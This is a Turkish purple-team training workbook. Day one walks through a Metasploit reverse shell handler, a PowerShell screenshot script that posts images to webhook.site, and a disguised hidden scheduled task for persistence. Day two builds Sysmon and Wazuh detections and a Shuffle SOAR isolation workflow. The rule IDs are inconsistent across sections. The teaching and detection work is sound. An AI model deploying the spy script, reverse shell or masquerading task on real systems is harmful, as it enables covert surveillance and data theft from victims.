# BAIBUSEC — CyberFirst'26
## Purple Team: Uçtan Uca Saldırı ve Savunma
### Eğitim Takip ve Uygulama Kitapçığı

> **Bu kitapçık eğitim sırasında kullanılmak üzere hazırlanmıştır.**
> Her lab adımını sırasıyla takip edin. Bir adımı tamamlamadan bir sonrakine geçmeyin.

---

## Eğitim Mimarisi (Genel Bakış)

```
┌─────────────────────────────────────────────────────────────────┐
│                     EĞİTİM AĞITOPLOJISI                         │
│                                                                  │
│  [Eğitmen Host]          [Ubuntu VM: 192.168.100.10]            │
│   Metasploit  ──sızma──▶  (Wazuh Manager + Shuffle SOAR)       │
│                                │                                 │
│                         Wazuh Agent log akışı                   │
│                                │                                 │
│                         [Windows 10 VM: 192.168.100.20]         │
│                          Kurban Makine                           │
│                          spy.ps1 çalışıyor                       │
│                                │                                 │
│                         Base64 ekran görüntüsü                  │
│                                ▼                                 │
│                         [webhook.site]                           │
│                          (İnternet üzerinden)                    │
│                                                                  │
│  [Analist Telefonu]                                             │
│   Telegram ◀── Shuffle SOAR bildirimi                          │
│   [İzole Et] butonu ──▶ Wazuh REST API ──▶ Agent isolation     │
└─────────────────────────────────────────────────────────────────┘
```

---

## İçindekiler

- [1. GÜN: RED TEAM — Saldırı Operasyonları](#1-gün-red-team--saldırı-operasyonları)
  - [T1 — Teori: LotL ve APT Metodolojileri](#t1--teori-living-off-the-land-ve-apt-metodolojileri)
  - [L1 — Lab: Metasploit ile Initial Access (Eğitmen Demosu)](#l1--lab-metasploit-ile-initial-access-eğitmen-demosu)
  - [L2 — Lab: spy.ps1 Scriptini Tanıyalım](#l2--lab-spyps1-scriptini-tanıyalım)
  - [L3 — Lab: Exfiltration — webhook.site Takibi](#l3--lab-exfiltration--webhooksite-takibi)
  - [L4 — Lab: Persistence — Scheduled Task ile Kalıcılık](#l4--lab-persistence--scheduled-task-ile-kalıcılık)
- [2. GÜN: BLUE TEAM & SOAR — Savunma ve Otomasyon](#2-gün-blue-team--soar--savunma-ve-otomasyon)
  - [T2 — Teori: SOC Mimarisi ve Detection Engineering](#t2--teori-soc-mimarisi-ve-detection-engineering)
  - [L5 — Lab: Sysmon Kurulumu](#l5--lab-sysmon-kurulumu)
  - [L6 — Lab: Wazuh Agent Kurulumu](#l6--lab-wazuh-agent-kurulumu)
  - [L7 — Lab: Wazuh Özel Kural Yazımı](#l7--lab-wazuh-özel-kural-yazımı)
  - [L8 — Lab: Shuffle SOAR Workflow](#l8--lab-shuffle-soar-workflow)

---

---

# 1. GÜN: RED TEAM — Saldırı Operasyonları

> **Günün Amacı:** Saldırganın bakış açısını anlamak. Gerçek APT tekniklerini MITRE ATT&CK çerçevesinde incelemek ve uygulama ortamında gözlemlemek.

---

## T1 — Teori: Living off the Land ve APT Metodolojileri

### Living off the Land (LotL) Nedir?

Geleneksel kötü amaçlı yazılımlar (malware) hedef sisteme yeni dosyalar, araçlar veya kütüphaneler indirir. Bu durum antivirüs ve EDR sistemleri tarafından tespit edilmeyi kolaylaştırır.

**LotL saldırganı ise tam tersini yapar:**

> "Sisteme zaten kurulu olan araçlarla saldırırım. Yabancı bir şey bırakmam."

Saldırgan, Windows'un kendi araçlarını silah olarak kullanır:

| Araç | MITRE Tekniği | Saldırgan Kullanımı |
|---|---|---|
| `powershell.exe` | T1059.001 | Payload çalıştırma, exfiltration |
| `schtasks.exe` | T1053.005 | Persistence (zamanlanmış görev) |
| `certutil.exe` | T1140 | Base64 decode, dosya indirme |
| `wmic.exe` | T1047 | Lateral movement, keşif |
| `mshta.exe` | T1218.005 | Script çalıştırma (UAC bypass) |
| `regsvr32.exe` | T1218.010 | DLL yürütme (proxy execution) |

**Bu eğitimde kullanacağımız LotL araçları:**
- `powershell.exe` → Ekran görüntüsü alma ve exfiltration
- `schtasks.exe` → Scheduled Task ile persistence

---

### APT Saldırı Metodolojisi

APT (Advanced Persistent Threat) saldırıları genellikle aşağıdaki aşamalardan oluşur. Bu aşamalar hem **Cyber Kill Chain** hem de **MITRE ATT&CK** çerçeveleriyle eşleşir:

```
[Reconnaissance]  →  [Initial Access]  →  [Execution]
       ↓
[Persistence]  →  [Privilege Escalation]  →  [Defense Evasion]
       ↓
[Discovery]  →  [Lateral Movement]  →  [Collection]
       ↓
[Exfiltration]  →  [Impact]
```

**Bu eğitimde odaklanacağımız aşamalar:**

```
[Initial Access]  →  [Execution]  →  [Persistence]  →  [Exfiltration]
  (Metasploit)      (spy.ps1)     (Scheduled Task)   (webhook.site)
```

---

### MITRE ATT&CK Matrisinin Kullanımı

> 🌐 **Tarayıcınızda açın:** [https://attack.mitre.org](https://attack.mitre.org)

MITRE ATT&CK, saldırganların gerçek dünyada kullandığı tekniklerin katalogudur. Her tekniğin bir ID'si vardır (örn. T1059.001) ve şunları içerir:
- Tekniğin açıklaması
- Gerçek APT gruplarının bu tekniği nasıl kullandığı
- Tespit yöntemleri (Detection)
- Mitigasyon önerileri

**Bugün ilgili olacak teknikler:**

| Teknik ID | İsim | Eğitimdeki Karşılığı |
|---|---|---|
| T1059.001 | PowerShell | spy.ps1 çalıştırma |
| T1053.005 | Scheduled Task | Persistence |
| T1041 | Exfiltration Over C2 Channel | webhook.site'a gönderme |
| T1113 | Screen Capture | Ekran görüntüsü |

---

## L1 — Lab: Metasploit ile Initial Access (Eğitmen Demosu)

> 🎓 **BU LAB EĞİTMEN TARAFINDAN YAPILMAKTADIR.**
> Siz bu adımları izleyeceksiniz. Kendi makinenizde uygulamayın.
> Eğitmen, host bilgisayarından Windows 10 VM'e (kurban) sızacaktır.

---

### [EĞITMEN — Demo Notları]

#### Amaç
Host makineden Windows 10 VM'e Metasploit ile bağlantı kurmak, ardından `spy.ps1` scriptini kurban makineye yüklemek.

#### Kullanılan Teknik
- **Exploit:** `exploit/multi/handler` (dinleyici — payload zaten kurban'da çalıştırılıyor)
- **Payload:** `windows/x64/meterpreter/reverse_tcp`

#### Adımlar

```bash
# Kali veya eğitmen makinesi terminalinde:
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER IP>
set LPORT 4444
exploit -j
```

Kurban makine üzerinde payload çalıştırıldıktan sonra Meterpreter oturumu açılır:

```bash
# Meterpreter oturumuna geç:
sessions -i 1

# Kurban sistemi hakkında bilgi topla:
sysinfo
getuid

# spy.ps1'i kurban makineye yükle:
upload /root/spy.ps1 "C:\\Users\\Public\\spy.ps1"

# Doğrula:
shell
dir C:\Users\Public\
exit
```

> **Öğrenciler için gözlem noktaları:**
> - Meterpreter oturumu açıldığında Windows Defender uyarısı veriyor mu?
> - `sysinfo` çıktısında neler görünüyor?
> - Dosya yükleme işlemi nasıl gerçekleşiyor?

---

## L2 — Lab: spy.ps1 Scriptini Tanıyalım

> 💻 Bu lab **Windows 10 VM** üzerinde yapılır.

### spy.ps1 Kaynak Kodu

```powershell
# .NET kütüphanelerini belleğe yükle
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Ekran boyutunu al
$Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($Screen.Width, $Screen.Height)
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)

# Ekranı kopyala
$graphic.CopyFromScreen(
    $Screen.Location,
    [System.Drawing.Point]::Empty,
    $bitmap.Size
)

# PNG olarak kaydet
$path = 'C:\Users\Public\ss.png'
$bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)

# Base64'e çevir
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
$json = @{
    content    = 'Kurban Ekrani: ' + (Get-Date).ToString()
    hostname   = $env:COMPUTERNAME
    image_data = $base64
} | ConvertTo-Json

# Webhook'a gönder
try {
    Invoke-RestMethod -Method Post `
        -Uri 'BURAYA-KENDI-WEBHOOK-URLINIZI-YAZIN' `
        -Body $json `
        -ContentType 'application/json'
} catch { }
```

### Script Ne Yapar? (Satır Satır Analiz)

| Bölüm | Açıklama | MITRE Tekniği |
|---|---|---|
| `Add-Type -AssemblyName` | .NET ekran yakalama kütüphanelerini belleğe yükler | T1059.001 |
| `CopyFromScreen()` | Ekranın anlık görüntüsünü bitmap olarak yakalar | T1113 |
| `$bitmap.Save($path, ...)` | Görüntüyü `C:\Users\Public\ss.png` olarak kaydeder | T1074 (Data Staged) |
| `[Convert]::ToBase64String(...)` | PNG dosyasını Base64 metnine çevirir (tespit engellemek için) | T1027 (Obfuscation) |
| `ConvertTo-Json` | Veriyi JSON formatına paketler | — |
| `Invoke-RestMethod -Method Post` | JSON'ı HTTP POST ile webhook'a gönderir | T1041 |

> **Neden Base64?**
> Base64 encoding, ikili (binary) veriyi metin formatına çevirir. Bu sayede görüntü dosyası doğrudan HTTP POST body'sinde taşınabilir. Aynı zamanda içerik analizi yapan bazı ağ güvenlik cihazlarını atlatmak amacıyla da kullanılır.

---

### Adım 2.1: Script'e Kendi Webhook URL'inizi Girin

Windows 10 VM üzerinde:

1. `C:\Users\Public\` klasörünü açın
2. `spy.ps1` dosyasına sağ tıklayın → **Edit** (Not Defteri veya PowerShell ISE ile açın)
3. Aşağıdaki satırı bulun:
   ```
   -Uri 'BURAYA-KENDI-WEBHOOK-URLINIZI-YAZIN'
   ```
4. `BURAYA-KENDI-WEBHOOK-URLINIZI-YAZIN` yerine **kendi webhook.site URL'inizi** yazın
5. Dosyayı kaydedin

### Adım 2.2: Script'i Manuel Çalıştırın (Test)

```powershell
# PowerShell açın ve aşağıdaki komutu çalıştırın.
powershell.exe -ExecutionPolicy Bypass -File C:\Users\Victim\Desktop\spy.ps1
```

> Hata yoksa sessizce çalışır ve tamamlanır. Şimdi webhook.site sayfanızı kontrol edin.

---

## L3 — Lab: Exfiltration — webhook.site Takibi

> 💻 Bu lab **Host Bilgisayar Tarayıcısı** üzerinden takip edilir.

### Adım 3.1: webhook.site'da Gelen İsteği Görüntüleme

1. Tarayıcınızda `https://webhook.site` açın
2. Sol panelde yeni bir istek görünmeli:
   - Method: `POST`
   - Zaman damgası
3. İsteğe tıklayın → **Body** sekmesini açın
4. JSON içeriğini inceleyin:
   ```json
   {
     "content": "Kurban Ekrani: 07.05.2026 14:32:15",
     "hostname": "VICTIM",
     "image_data": "iVBORw0KGgoAAAANSUhEUgAA..."
   }
   ```

### Adım 3.2: Base64 Görüntüyü Decode Etme

Gelen `image_data` değerini alıp görüntüye çevirin:

**Yöntem 1 — Online (Hızlı):**
1. [https://base64.guru/converter/decode/image](https://base64.guru/converter/decode/image) adresine gidin
2. `image_data` değerini yapıştırın → **Decode** tıklayın
3. Kurban makinenin ekran görüntüsü çıkacaktır

> 🎯 **Gözlem:** Ekran görüntüsünde ne görünüyor? Şifre, hassas belge, tarayıcı oturumu — bir saldırgan için bu veri ne kadar değerli?

---

## L4 — Lab: Persistence — Scheduled Task ile Kalıcılık

> 💻 Bu lab **Windows 10 VM** üzerinde yapılır.
> **MITRE Tekniği:** T1053.005 — Scheduled Task/Job

### Persistence Nedir?

Saldırgan kurban sisteme bir kez sızmakla yetinmez. Sistem yeniden başlatıldığında veya bağlantı koptuğunda bile sisteme erişimini korumak ister. Buna **kalıcılık (persistence)** sağlama denir.

**Windows Scheduled Task**, belirli aralıklarla veya belirli olaylar gerçekleştiğinde otomatik program çalıştırır. Saldırganlar bunu LotL tekniği olarak sıkça kullanır çünkü:
- Windows'un meşru bir özelliğidir
- Antivirüsler genellikle bunu şüpheli bulmaz
- Sistem yeniden başlatıldığında görev devam eder

---

### Adım 4.1: Scheduled Task Oluşturma

**Yöntem A — schtasks Komutu ile (CMD/PowerShell):**

```cmd
schtasks /create ^
  /tn "WindowsUpdateHelper" ^
  /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\spy.ps1" ^
  /sc MINUTE ^
  /mo 1 ^
  /ru "SYSTEM" ^
  /f
```

> **Parametreler:**
> - `/tn "WindowsUpdateHelper"` → Görevin adı (meşru görünmesi için Windows güncellemesiyle ilgili isim seçildi)
> - `/tr "..."` → Çalıştırılacak komut
> - `-WindowStyle Hidden` → PowerShell penceresi görünmez
> - `/sc MINUTE /mo 1` → Her 1 dakikada bir çalış
> - `/ru SYSTEM` → SYSTEM yetkisiyle çalış
> - `/f` → Varsa üzerine yaz (force)

**Yöntem B — PowerShell ile (Daha Gelişmiş):**

```powershell
$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\spy.ps1"

$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -Once -At (Get-Date)

$settings = New-ScheduledTaskSettingsSet -Hidden

Register-ScheduledTask `
    -TaskName "WindowsUpdateHelper" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -RunLevel Highest `
    -Force
```

### Adım 4.2: Görevi Doğrulama

**GUI ile doğrulama:**
1. `Win + R` → `taskschd.msc`
2. **Task Scheduler Library** altında `WindowsUpdateHelper` görevini bulun
3. Son çalışma zamanını ve bir sonraki çalışma zamanını inceleyin

### Adım 4.3: Canlı Takip

Görev her dakika çalıştığına göre webhook.site'a her dakika yeni bir POST gelmeli:

1. webhook.site sayfanızı açık tutun
2. Her yeni isteğin zaman damgasını kontrol edin
3. Yaklaşık 1 dakikada bir yeni ekran görüntüsü geldiğini gözlemleyin

---

### 1. Gün Özet: Saldırı Zinciri

```
[Eğitmen: Metasploit]
        │
        ▼ Meterpreter → upload spy.ps1
[Windows 10 VM]
        │
        ▼ spy.ps1 çalıştırıldı
[Ekran görüntüsü alındı → Base64 encode → HTTP POST]
        │
        ▼
[webhook.site] ← Saldırgan buradan izliyor
        
[Scheduled Task]
        │
        ▼ Her 1 dakikada otomatik tekrar
```

**Kullanılan MITRE Teknikleri:**
- T1059.001 — Command and Scripting Interpreter: PowerShell
- T1053.005 — Scheduled Task/Job
- T1113 — Screen Capture
- T1027 — Obfuscated Files or Information (Base64)
- T1041 — Exfiltration Over C2 Channel

---

---

# 2. GÜN: BLUE TEAM & SOAR — Savunma ve Otomasyon

> **Günün Amacı:** Dün gerçekleştirdiğimiz saldırıyı tespit etmek, anlamak ve otomatik yanıt vermek. "Saldırganın ne yaptığını bilmek, savunmacıyı güçlendirir."

---

## T2 — Teori: SOC Mimarisi ve Detection Engineering

### SOC (Security Operations Center) Nedir?

SOC, bir organizasyonun siber güvenlik olaylarını sürekli izleyen, tespit eden ve yanıt veren ekip ve teknoloji bütünüdür.

```
[Veri Kaynakları]          [Toplama & Analiz]       [Yanıt]
──────────────────         ──────────────────        ──────
Endpoint (EDR/AV)    ──▶                             Isolation
Network (IDS/IPS)    ──▶   SIEM / XDR          ──▶  Block
Firewall Logları     ──▶   (Wazuh)                   Alert
Cloud Logları        ──▶                             Escalate
```

### Detection Engineering Nedir?

Detection Engineering, tehditleri tespit etmek için kural ve mantık geliştirme disiplinidir.

**İyi bir detection rule:**
- Düşük **false positive** (yanlış alarm) üretir
- Gerçek tehdidi kaçırmaz (düşük **false negative**)
- Belirli bir MITRE ATT&CK tekniğine karşılık gelir
- Test edilebilir ve belgelenmiştir

### Neden Purple Team?

```
RED TEAM                    BLUE TEAM
(Saldırgan bakışı)          (Savunmacı bakışı)
    │                              │
    └──────────▶ PURPLE ◀──────────┘
                 TEAM
            (İkisi birlikte)
```

Purple Team, saldırı ve savunma ekiplerinin **aynı anda çalışması** demektir. Saldırgan bir teknik kullanır, savunmacı bunu gerçek zamanlı olarak tespit etmeye çalışır. Bu döngü, detection kalitesini dramatik biçimde artırır.

---

## L5 — Lab: Sysmon Kurulumu

> 💻 Bu lab **Windows 10 VM** üzerinde yapılır.

### Sysmon Nedir?

**System Monitor (Sysmon)**, Windows'un varsayılan olarak loglamadığı olayları detaylı biçimde kaydeden, Microsoft Sysinternals'ın ücretsiz aracıdır.

Sysmon olmadan Windows'un kaydetmediği ama Sysmon'un kaydettiği olaylar:

| Sysmon Event ID | Olay |
|---|---|
| 1 | Process Create (hangi process, hangi komutla başlatıldı) |
| 3 | Network Connection (hangi process nereye bağlandı) |
| 11 | File Create (hangi dosya oluşturuldu) |
| 12/13 | Registry Create/Modify |
| 22 | DNS Query |

> Bizim için en önemli: **Event ID 1** (spy.ps1'i çalıştıran PowerShell process'i) ve **Event ID 3** (webhook.site'a yapılan ağ bağlantısı).

### Adım 5.1: Sysmon İndirme

```powershell
# PowerShell ile indir (veya tarayıcıdan manuel indirin)
Invoke-WebRequest `
    -Uri "https://download.sysinternals.com/files/Sysmon.zip" `
    -OutFile "C:\Users\Public\Sysmon.zip"

# Aynı dizine çıkar
Expand-Archive -Path "C:\Users\Public\Sysmon.zip" `
               -DestinationPath "C:\Users\Public\Sysmon"
```

### Adım 5.2: SwiftOnSecurity Konfigürasyonu İndirme

SwiftOnSecurity config, siber güvenlik topluluğu tarafından geliştirilmiş, production-ready bir Sysmon konfigürasyonudur. Gereksiz olayları filtreler, önemli olanları yakalar.

```powershell
Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
    -OutFile "C:\Users\Public\sysmonconfig.xml"
```

### Adım 5.3: Sysmon Kurulumu

```cmd
# Yönetici CMD ile çalıştırın
cd C:\Users\Public\Sysmon

Sysmon64.exe -accepteula -i C:\Users\Public\sysmonconfig.xml
```

### Adım 5.4: Sysmon Loglarını Doğrulama

```powershell
# Sysmon servisinin çalıştığını doğrula
Get-Service Sysmon64

# Son 5 Sysmon event'ini görüntüle
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 |
    Format-List TimeCreated, Id, Message
```

**Event Viewer ile:**
1. `Win + R` → `eventvwr.msc`
2. **Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**
3. Event ID 1 kayıtlarını inceleyin — her process başlatma burada görünür

---

## L6 — Lab: Wazuh Agent Kurulumu

> 💻 Bu lab **Windows 10 VM** üzerinde yapılır.

Wazuh Agent, Windows'un Event Log'larını (Sysmon dahil) Wazuh Manager'a iletir.

### Adım 6.1: Wazuh Agent İndirme ve Kurma (Arayüzden Deploy Etme Kısmını Eğitmen ile Yap)

```powershell
# Yönetici PowerShell ile çalıştırın

# Agent'ı indir
Invoke-WebRequest `
    -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.2-1.msi" `
    -OutFile "C:\Users\Public\wazuh-agent.msi"

# Sessiz kurulum (MANAGER_IP'yi Ubuntu VM IP'si ile değiştirin)
Start-Process msiexec.exe -Wait -ArgumentList `
    '/i C:\Users\Public\wazuh-agent.msi', `
    'WAZUH_MANAGER="192.168.100.10"', `
    'WAZUH_AGENT_NAME="victim-pc"', `
    '/qn'
```

### Adım 6.2: Agent Servisi Başlatma

```powershell
NET START WazuhSvc
Get-Service WazuhSvc
# Status: Running görmelisiniz
```

### Adım 6.3: Sysmon Loglarının Wazuh'a İletilmesi 

Wazuh, Sysmon loglarını otomatik toplar. Ancak konfigürasyonun doğru olduğunu kontrol etmek için:

```xml
<!-- C:\Program Files (x86)\ossec-agent\ossec.conf dosyasını Not Defteri ile açın veya Wazuh UI üzerinden Agent Managements kısmından Groups diyerek Ajan Grubuna topluca config gönderilebilir. -->
<!-- Aşağıdaki bloğun var olduğunu doğrulayın: -->

<localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
</localfile>
```

Eğer bu blok yoksa dosyaya ekleyin ve servisi yeniden başlatın:
```powershell
NET STOP WazuhSvc
NET START WazuhSvc
```

### Adım 6.4: Wazuh Dashboard'da Agent'ı Görme

1. Tarayıcıdan `https://192.168.100.10` adresine gidin (Ubuntu VM)
2. Admin ile giriş yapın
3. **Agents** menüsüne gidin
4. `victim-pc` adında agent'ı görmelisiniz — Status: **Active**

> ⚠️ Agent "Never connected" veya "Disconnected" görünüyorsa:
> - Ubuntu VM'de port 1514-1515'in açık olduğunu kontrol edin
> - Windows Firewall'da Wazuh portlarına izin verin:
>   ```cmd
>   netsh advfirewall firewall add rule name="Wazuh" dir=out action=allow protocol=TCP remoteport=1514,1515
>   ```

---

## L7 — Lab: Wazuh Özel Kural Yazımı

> 💻 Bu lab **Ubuntu VM** üzerinde yapılır (SSH veya doğrudan konsol).

### Hedef

`spy.ps1` tarafından oluşturulan iki davranışı tespit eden kural yazacağız:

1. **PowerShell'in `-WindowStyle Hidden` parametresiyle başlatılması** (Scheduled Task çalıştığında)
2. **`webhook.site`'a yapılan ağ bağlantısı** (Sysmon Event ID 3)

### Wazuh Kural Yapısı

```xml
<rule id="[ID]" level="[0-15]">
    <if_group>[grup adı]</if_group>
    <field name="[alan adı]" type="pcre2">[regex pattern]</field>
    <description>[Açıklama]</description>
    <mitre>
        <id>[MITRE teknik ID]</id>
    </mitre>
</rule>
```

**Severity Seviyeleri (level):**
- 0-3: Bilgilendirme
- 4-7: Düşük/Orta
- 8-11: Yüksek
- 12-15: Kritik

---

### Adım 7.1: Kural Dosyasını Oluşturma

```xml
# Wazuh Manager arayüzünden kural düzenleme kısmını aç
Server Management > Rules

# Local Rules dosyasını düzenle
Arama yerine Local_Rules yaz ve düzenle.

# Kural dosyasını oluştur
  <rule id="100001" level="12">
      <if_sid>61603</if_sid>
      <field name="win.eventdata.image" type="pcre2">.schtasks\.exe</field>
      <field name="win.eventdata.commandLine" type="pcre2">(?i)WindowStyle\s+Hidden|ExecutionPolicy\s+Bypass</field>
      <description>PurpleTeam: Şüpheli parametrelerle (Hidden/Bypass) zamanlanmış görev tespiti!</description>
      <mitre>
        <id>T1053.005</id>
      </mitre>
  </rule>

echo "Kurallar yazıldı."
```

### Adım 7.2: Kural Söz Dizimini Doğrulama

```bash
# Wazuh'un rule syntax kontrolü
/var/ossec/bin/ossec-logtest -t

# Daha kapsamlı test:
/var/ossec/bin/wazuh-logtest
```

### Adım 7.3: Wazuh Manager'ı Yeniden Başlatma

```bash
# Container içindeyseniz:
/var/ossec/bin/wazuh-control restart

# Veya container'dan çıkıp Docker ile:
exit
docker restart single-node-wazuh.manager-1

# Manager'ın tamamen ayağa kalkmasını bekleyin (~30 sn)
docker logs single-node-wazuh.manager-1 --tail 20
```

### Adım 7.4: Alarm Tetikleme ve Gözlemleme

Windows 10 VM'de spy.ps1'i manuel çalıştırın:
```powershell
& "C:\Users\Public\spy.ps1"
```

Wazuh Dashboard'da:
1. **Security Events** (veya **Events**) menüsüne gidin
2. Rule ID `100001`, `100002`, `100003` alarmlarını arayın
3. Her alarmın detayını inceleyin:
   - Event data (hangi process, hangi komut)
   - MITRE ATT&CK tag'leri
   - Zaman damgası

> 🎯 **Gözlem:** Bir önceki gün "saldırgan" olarak gerçekleştirdiğiniz her adımın artık Wazuh'ta iz bıraktığını görüyorsunuz. Purple Team döngüsü bu anlık görünürlük üzerine kurulur.

---

## L8 — Lab: Shuffle SOAR Workflow

> 💻 Bu lab **Host Bilgisayar Tarayıcısı** üzerinden `http://192.168.100.10:3001` adresine bağlanılarak yapılır.

### SOAR Nedir?

**Security Orchestration, Automation and Response (SOAR)**, güvenlik olaylarına verilen yanıtları otomatikleştiren platformdur.

**Fark ne?**
- **SIEM** (Wazuh): Logları toplar, analiz eder, alarm üretir → **Tespit**
- **SOAR** (Shuffle): Alarmı alır, analist bildirir, aksiyonu otomatikleştirir → **Yanıt**

### Oluşturacağımız Workflow'un Şematik Görünümü

```
[1. TRIGGER]
Wazuh Webhook
(Alarm gelince tetikle)
        │
        ▼
[2. KOŞUL KONTROLÜ]
Rule ID 100500, 100501,
100502 veya 100503 mü?
        │
    Evet│
        ▼
[3. BİLDİRİM]
Telegram Bot
"⚠️ ALARM: [Kural adı]
Makine: [Hostname]
Komut: [CommandLine]
[İzole Et ✅] [Yoksay ❌]"
        │
        ├──── Analist [İzole Et]'e basarsa
        │              │
        │              ▼
        │     [4a. İZOLASYON]
        │     Wazuh REST API
        │     PUT /active-response
        │     → agent-id: [victim-pc]
        │     → command: "netsh advfirewall..."
        │              │
        │              ▼
        │     [5a. ONAY BİLDİRİMİ]
        │     Telegram: "✅ Makine izole edildi."
        │
        └──── Analist [Yoksay]'a basarsa
                       │
                       ▼
              [4b. ATLAMA]
              Workflow biter.
```

---

### Adım 8.1: Wazuh'ta Shuffle Entegrasyonu Ayarlama

#### 8.1.1 Shuffle Webhook URL'ini Alma

1. Shuffle UI'a giriş yapın → **Workflows** → **New Workflow**
2. Workflow adı: `CyberFirst_Response`
3. Canvas açılır — sol panelden **Triggers** → **Webhook** sürükleyin
4. Webhook node'a tıklayın → URL kopyalayın:
   ```
   http://192.168.100.10:3001/api/v1/hooks/webhook_XXXXXXXXXXXX
   ```

#### 8.1.2 Wazuh Manager'da Shuffle Entegrasyonu Aktifleştirme

```bash
docker exec -it single-node-wazuh.manager-1 bash

# ossec.conf dosyasını düzenle
nano /var/ossec/etc/ossec.conf
```

`</ossec_config>` kapanış etiketinden önce şu bloğu ekleyin:

```xml
<integration>
    <name>shuffle</name>
    <hook_url>http://192.168.100.10:3001/api/v1/hooks/webhook_XXXXXXXXXXXX</hook_url>
    <rule_id>100500,100501,100502,100503</rule_id>
    <alert_format>json</alert_format>
</integration>
```

```bash
# Kaydet ve çık (Ctrl+X, Y, Enter)
# Manager'ı yeniden başlat
/var/ossec/bin/wazuh-control restart
exit
```

> 📝 **Not:** `active-response` özelliğini kullanacağımız için `ossec.conf` içinde active-response bloğunun aktif olduğunu doğrulayın. Container'a bağlanıp kontrol edin:
> ```bash
> grep -A5 "active-response" /var/ossec/etc/ossec.conf
> ```
> Eğer yoksa, aşağıdaki bloğu da `ossec.conf` içine ekleyin:
> ```xml
> <active-response>
>     <disabled>no</disabled>
> </active-response>
> ```

---

### Adım 8.2: Telegram Bot Oluşturma

#### 8.2.1 BotFather ile Bot Oluşturma

1. Telegram'da **@BotFather**'ı aratın
2. `/newbot` yazın
3. Bot adı: `CyberFirst SOC Bot`
4. Bot kullanıcı adı: `cyberfirst_soc_bot` (benzersiz olmalı)
5. BotFather size bir **API Token** verir:
   ```
   7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   ```
   Bu token'ı not alın.

#### 8.2.2 Chat ID'nizi Alma

1. Telegram'da botunuzu bulun ve `/start` yazın
2. Tarayıcıda şu URL'i açın (token'ı değiştirin):
   ```
   https://api.telegram.org/bot<TOKEN>/getUpdates
   ```
3. JSON çıktısında `"chat":{"id":XXXXXXXXX}` değerini bulun — bu sizin **Chat ID**'nizdir.

---

### Adım 8.3: Shuffle Workflow Oluşturma

#### Canvas Akışı

Shuffle'da aşağıdaki node'ları sırasıyla ekleyin ve birbirine bağlayın:

---

**Node 1: Webhook Trigger (Zaten oluşturuldu)**
- Tip: **Webhook**
- Ad: `Wazuh_Alarm`
- Bu node Wazuh'tan gelen JSON'ı alır

---

**Node 2: Condition — Kural ID Filtresi**
- Sol panelden **Tools → Condition** sürükleyin
- Ad: `Check_Rule_ID`
- Condition:
  ```
  $Wazuh_Alarm.rule.id  matches  10050[0-3]
  ```
- Bu koşul sağlanmazsa workflow durur (gereksiz alarmları filtreler)

---

**Node 3: Telegram Bildirim**
- Sol panelden **Apps** aratın → **Telegram** ekleyin
- Action: **Send Message with Buttons** (veya **sendMessage**)
- Parametreler:

| Alan | Değer |
|---|---|
| API Token | `7123456789:AAFxxxx...` (botunuzun token'ı) |
| Chat ID | `XXXXXXXXX` (sizin chat ID'niz) |
| Message | Aşağıya bakın |

**Mesaj Şablonu:**
```
⚠️ CYBERFIRST SOC ALARM ⚠️

🔴 Kural: $Wazuh_Alarm.rule.description
🆔 Kural ID: $Wazuh_Alarm.rule.id
🖥️ Makine: $Wazuh_Alarm.agent.name
📅 Zaman: $Wazuh_Alarm.timestamp
💻 Komut: $Wazuh_Alarm.data.win.eventdata.commandLine

Aksiyonu seçin:
```

**Inline Keyboard Buttons:**
```json
[
  [
    {"text": "✅ İzole Et", "callback_data": "isolate"},
    {"text": "❌ Yoksay", "callback_data": "ignore"}
  ]
]
```

---

**Node 4: Telegram Cevap Bekle**
- Tip: **Trigger → User Input** (Shuffle'da "User Input" trigger)
- Buton seçimini bekler
- Timeout: 3600 saniye (1 saat)

---

**Node 5a: Wazuh REST API — İzolasyon (Koşullu)**
- Condition: `$UserInput.callback_data == "isolate"`
- Tip: **HTTP**
- Method: `PUT`
- URL:
  ```
  https://192.168.100.10:55000/active-response?agents_list=$Wazuh_Alarm.agent.id
  ```
- Headers:
  ```
  Authorization: Bearer <JWT_TOKEN>
  Content-Type: application/json
  ```
- Body:
  ```json
  {
    "command": "netsh advfirewall set allprofiles state on",
    "arguments": [],
    "alert": {
      "data": {
        "srcip": "$Wazuh_Alarm.data.win.eventdata.destinationIp"
      }
    }
  }
  ```

> **JWT Token Nasıl Alınır?**
> ```bash
> curl -u admin:SecretPassword -k \
>   -X GET "https://192.168.100.10:55000/security/user/authenticate?raw=true"
> ```
> Dönen token'ı kopyalayın. Bu token 15 dakika geçerlidir; production'da Shuffle'da bir `Authenticate` adımı eklemeniz gerekir.

---

**Node 5b: Telegram Onay Mesajı (İzolasyon Sonrası)**
- Action: **Send Message**
- Message:
  ```
  ✅ Makine izole edildi.
  Agent: $Wazuh_Alarm.agent.name
  Zaman: $exec.timestamp
  
  İzolasyonu kaldırmak için /deisolate komutunu kullanın.
  ```

---

**Node 5c: Telegram Yoksay Mesajı**
- Condition: `$UserInput.callback_data == "ignore"`
- Action: **Send Message**
- Message:
  ```
  ℹ️ Alarm yoksayıldı.
  Kural ID: $Wazuh_Alarm.rule.id
  Analist tarafından düşük öncelikli olarak işaretlendi.
  ```

---

### Adım 8.4: Workflow'u Kaydetme ve Aktifleştirme

1. Sağ üstten **Save** tıklayın
